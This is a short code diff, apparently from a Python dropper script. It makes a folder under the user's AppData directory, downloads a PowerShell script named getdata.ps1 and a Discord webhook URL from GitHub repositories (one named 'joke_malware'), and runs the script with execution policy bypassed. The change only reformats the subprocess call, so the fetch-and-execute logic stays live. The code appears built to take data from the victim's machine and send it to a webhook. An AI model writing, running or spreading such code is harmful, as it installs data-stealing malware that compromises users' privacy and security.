@@ -5,8 +5,4 @@ c = f"C:\\Users\\{user}\\AppData\\Local\\{d}"
 os.mkdir(c)
 install("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", f"{c}\\getdata.ps1")
 install("https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt", f"{c}\\discord_webhook.txt")
-subprocess.check_call(
-  [
-    "powershell", "-ExecutionPolicy", "Bypass", "-File", f"{c}\\getdata.ps1"
-  ]
-)
+subprocess.check_call(["powershell", "-ExecutionPolicy", "Bypass", "-File", f"{c}\\getdata.ps1"])
